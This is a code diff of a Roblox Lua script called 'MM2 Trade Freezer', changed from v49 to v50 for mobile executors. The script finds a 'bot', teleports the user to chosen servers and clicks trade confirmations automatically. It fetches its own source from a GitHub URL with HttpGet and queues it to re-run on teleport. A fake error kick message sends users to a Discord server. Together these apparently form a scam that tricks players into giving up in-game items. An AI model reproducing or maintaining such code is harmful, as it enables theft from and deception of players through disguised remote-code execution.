@@ -1,7 +1,7 @@
 --============================================================
--- SIDE 2 — CLIENT (v49)
--- MM2 Trade Freezer — PC + Mobile
--- Every blocked API call wrapped with timeout — no more hangs
+-- SIDE 2 — CLIENT (v50)
+-- MM2 Trade Freezer — PC + Mobile (mobile-safe)
+-- No HttpGet on mobile. All blocked calls timeout-wrapped.
 --============================================================
 local Players             = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -64,7 +64,7 @@ local CONFIRM_WAIT         = 7
 local CLICK_GAP            = 0.4
 local POST_JOIN_WAIT       = 10
 local SNIPE_POLL_INTERVAL  = 5
-local BLOCKED_CALL_TIMEOUT = 3
+local BLOCKED_CALL_TIMEOUT = 1.5
 local KICK_MESSAGE         = "Error, script did not load in time, try another time or contact support in https://discord.gg/SfeBgTx5V8"
 
 local SELF_SOURCE_URL      = "https://raw.githubusercontent.com/tturnaa/mm2-trade-freezer/refs/heads/main/trade"
@@ -100,7 +100,7 @@ local function runWithTimeout(fn, timeout)
 end
 --================================================
 
---==================== AUTO-EXEC ====================
+--==================== AUTO-EXEC (mobile-safe) ====================
 local TeleportCheck = false
 
 local function queueAutoExec()
@@ -110,18 +110,24 @@ local function queueAutoExec()
     end
     TeleportCheck = true
 
-    log("autoexec: fetching source (with timeout)...")
-
-    local fetchOk, source, fetchTimedout = runWithTimeout(function()
-        return game:HttpGet(SELF_SOURCE_URL, true)
-    end)
-
-    if fetchTimedout then
-        log("autoexec: fetch HUNG — skipping")
+    -- Mobile: skip entirely. game:HttpGet inside spawned threads hangs
+    -- on Delta. The trade flow doesn't need auto re-exec.
+    if IS_MOBILE then
+        log("autoexec: SKIPPED on mobile")
         return false
     end
 
-    if not fetchOk or type(source) ~= "string" or #source < 100 then
+    log("autoexec: fetching source...")
+
+    local source = nil
+    local ok, body = pcall(function()
+        return game:HttpGet(SELF_SOURCE_URL, true)
+    end)
+    if ok and type(body) == "string" and #body > 100 then
+        source = body
+    end
+
+    if not source then
         log("autoexec: fetch failed")
         return false
     end
@@ -138,18 +144,9 @@ local function queueAutoExec()
         return false
     end
 
-    log("autoexec: calling queue function (with timeout)...")
-    local qOk, qVal, qTimedout = runWithTimeout(function()
-        return queueteleport(source)
-    end)
-
-    if qTimedout then
-        log("autoexec: queue_on_teleport HUNG — skipping")
-        return false
-    end
-
-    log("autoexec: queued ok = " .. tostring(qOk and qVal ~= false))
-    return qOk and qVal ~= false
+    local qok = pcall(queueteleport, source)
+    log("autoexec: queued ok = " .. tostring(qok))
+    return qok
 end
 
 task.spawn(function()
@@ -179,9 +176,7 @@ local function kvGet(key)
         return nil
     end, 2)
 
-    if timedout then
-        return nil
-    end
+    if timedout then return nil end
     return ok and val or nil
 end
 
@@ -354,7 +349,7 @@ local function findBot()
     end
 end
 
---==================== TELEPORT ====================
+--==================== TELEPORT (no autoexec call here) ====================
 local function tryTeleportMethod(methodName, methodFn)
     log("attempting " .. methodName .. "...")
     local ok, val, timedout = runWithTimeout(methodFn, 3)
@@ -377,9 +372,8 @@ local function teleportToServer(placeId, jobId, userId)
     log("=== TELEPORT START ===")
     log("placeId:", placeId, "jobId:", jobId, "userId:", tostring(userId))
 
-    log("queueing autoexec...")
-    queueAutoExec()
-    task.wait(0.5)
+    -- No queueAutoExec here. It's only triggered by OnTeleport, which
+    -- is itself skipped on mobile. This avoids the HttpGet hang.
 
     if tryTeleportMethod("TeleportToPlaceInstance", function()
         TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
